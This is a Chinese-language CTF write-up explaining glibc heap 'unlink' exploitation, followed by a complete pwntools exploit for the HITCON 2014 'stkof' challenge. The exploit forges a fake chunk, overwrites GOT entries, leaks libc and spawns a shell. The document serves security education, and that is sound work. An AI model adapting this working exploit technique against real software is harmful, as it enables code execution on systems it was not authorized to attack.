原理

0x00 unlink是什么

unlink说的是linux系统在进行空闲堆块管理的时候，进行空闲堆块的合并操作。一般发生在程序进行堆块释放之后。


（图片来自ctf wiki）


其实操作就是（学过数据结构应该很好理解）

  1.     p->fd->bk = p->bk
  2.     p->bk->fd = p->fd

0x01 从源代码理解unlink

  1.     #define unlink(P, BK, FD) {                                            
  2.         FD = P->fd;                                      
  3.         BK = P->bk;                                      
  4.         if (__builtin_expect (FD->bk != P || BK->fd != P, 0))          
  5.           malloc_printerr (check_action, "corrupted double-linked list", P);   //这里有一个unlink的防护
  6.         else {                                      
  7.             FD->bk = BK;        \\进行了检查(核心代码)                             
  8.             BK->fd = FD;                                  
  9.             if (!in_smallbin_range (P->size)                      
  10.                 && __builtin_expect (P->fd_nextsize != NULL, 0)) {              
  11.                 assert (P->fd_nextsize->bk_nextsize == P);                  
  12.                 assert (P->bk_nextsize->fd_nextsize == P);                  
  13.                 if (FD->fd_nextsize == NULL) {                      
  14.                     if (P->fd_nextsize == P)                      
  15.                       FD->fd_nextsize = FD->bk_nextsize = FD;              
  16.                     else {                                  
  17.                         FD->fd_nextsize = P->fd_nextsize;                  
  18.                         FD->bk_nextsize = P->bk_nextsize;                  
  19.                         P->fd_nextsize->bk_nextsize = FD;                  
  20.                         P->bk_nextsize->fd_nextsize = FD;                  
  21.                       }                                  
  22.                   } else {                                  
  23.                     P->fd_nextsize->bk_nextsize = P->bk_nextsize;              
  24.                     P->bk_nextsize->fd_nextsize = P->fd_nextsize;              
  25.                   }                                      
  26.               }                                      
  27.           }                                          
  28.     }

可以看出我们需要满足以下条件才能绕过检查

  1.     FD->bk = BK;                              
  2.     BK->fd = FD;

为了绕过检查，我们必须在全局变量区找到一个指向堆块的地方，若该指针为ptr

  1.     32位  
  2.     FD = ptr-12
  3.     BK = ptr-8
  5.     64位  
  6.     FD = ptr-0x18
  7.     BK = ptr-0x10

0x01 流程分析

  1. alloc (输入分配内存的大小size)

  2. read_in (往分配的内存中输入内容，允许写入任意长度，可造成堆溢出)

  3. free （释放内存块）

  4. useless （无用函数）


0x02 利用过程

  • 首先构造3个chunk：chunk1、chunk2、chunk3，

  • 利用漏洞溢出chunk2，使chunk2和chunk3合并，利用unlink

  1.     alloc(0x100)  # id 1
  2.     # begin 
  3.     alloc(0x40)  # id 2
  4.     # small chunk size in order to trigger unlink
  5.     alloc(0x80)  # id 3
  6.     # a fake chunk at global[2]=head+16 who's size is 0x20
  7.     payload = p64(0)  #prev_size
  8.     payload += p64(0x40)  #current size
  9.     payload += p64(head + 16 - 0x18)  #fd +16因为这是bss段，第二个堆块
  10.     payload += p64(head + 16 - 0x10)  #bk
  11.     payload = payload.ljust(0x40, 'a')
  12.     # overwrite global[3]'s chunk's prev_size
  13.     # make it believe that prev chunk is at chunk2
  14.     payload += p64(0x40)
  15.     # make it believe that prev chunk is free
  16.     payload += p64(0x90)
  17.     edit(2, len(payload), payload)
  18.     # unlink fake chunk, so chunk[2] =&(chunk[2])-0x18=head-8
  19.     free(3)

  • 修改 chunk0 为 free@got 地址，同时修改chunk1为 puts@got 地址，chunk2 为 atoi@got 地址

  • free@got的值覆盖为puts@plt

  1.     payload = 'a' * 8 + p64(stkof.got['free']) + p64(stkof.got['puts']) + p64(stkof.got['atoi'])
  2.     edit(2, len(payload), payload)
  3.     payload = p64(stkof.plt['puts'])
  4.     edit(0, len(payload), payload)

  • leak出system地址，覆盖atoi@got

  1.     free(1)
  2.     puts_addr = p.recvuntil('\nOK\n', drop=True).ljust(8, '\x00')
  3.     puts_addr = u64(puts_addr)
  4.     puts_offset = puts_addr - libc.symbols['puts']
  5.     system_addr = puts_offset + libc.symbols['system']
  7.     payload = p64(system_addr)
  8.     edit(2, len(payload), payload)
  9.     p.send('/bin/sh')

0x03 exp

  1.     #!/usr/bin/python
  2.     # -*- coding: utf-8 -*-
  3.     from pwn import *
  5.     context.log_level = 'debug'
  6.     p = process("./hitcon-14-stkof")
  7.     stkof = ELF('hitcon-14-stkof')
  8.     libc = ELF('./libc.so.6')
  10.     head = 0x602140
  13.     def alloc(size):
  14.         p.sendline('1')
  15.         p.sendline(str(size))
  16.         p.recvuntil('OK\n')
  19.     def edit(idx, size, content):
  20.         p.sendline('2')
  21.         p.sendline(str(idx))
  22.         p.sendline(str(size))
  23.         p.send(content)
  24.         p.recvuntil('OK\n')
  27.     def free(idx):
  28.         p.sendline('3')
  29.         p.sendline(str(idx))
  32.     def pwn():
  33.         # small chunk size in order to trigger unlink
  34.         alloc(0x100) # id 1
  35.         alloc(0x40)  # id 2
  36.         alloc(0x80)  # id 3
  37.         # a fake chunk at chunk[2]=head+16 who's size is 0x40
  38.         payload = p64(0)  #prev_size
  39.         payload += p64(0x40)  #size
  40.         payload += p64(head + 16 - 0x18)  #fd
  41.         payload += p64(head + 16 - 0x10)  #bk
  42.         #payload += p64(0x20)  # next chunk's prev_size bypass the check
  43.         payload = payload.ljust(0x40, 'a')
  44.         # overwrite chunk[3]'s chunk's prev_size
  45.         # make it believe that prev chunk is at chunk[2]
  46.         payload += p64(0x40)
  47.         # make it believe that prev chunk is free
  48.         payload += p64(0x90)
  49.         edit(2, len(payload), payload)
  51.         # unlink fake chunk, so chunk[2] =&(chunk[2])-0x18=head-8
  52.         free(3)
  53.         p.recvuntil('OK\n')
  55.         # overwrite chunk0 = free@got, chunk1=puts@got, chunk2=atoi@got
  56.         payload = 'a' * 8 + p64(stkof.got['free']) + p64(stkof.got['puts']) + p64(stkof.got['atoi'])
  59.         edit(2, len(payload), payload)
  60.         # edit free@got to puts@plt
  61.         payload = p64(stkof.plt['puts'])
  62.         edit(0, len(payload), payload)
  64.         free(1)
  66.         puts_addr = p.recvuntil('\nOK\n', drop=True).ljust(8, '\x00')
  67.         puts_addr = u64(puts_addr)
  69.         log.success('puts_addr: ' + hex(puts_addr))
  70.         puts_offset = puts_addr - libc.symbols['puts']
  71.         system_addr = puts_offset + libc.symbols['system']
  72.         log.success('put_offset: ' + hex(puts_offset))
  73.         log.success('system_addr: ' + hex(system_addr))
  75.         # turn atoi@got into system addr
  77.         payload = p64(system_addr)
  78.         edit(2, len(payload), payload)
  81.         #p.send('/bin/sh')
  82.         p.interactive()
  83.     pwn()
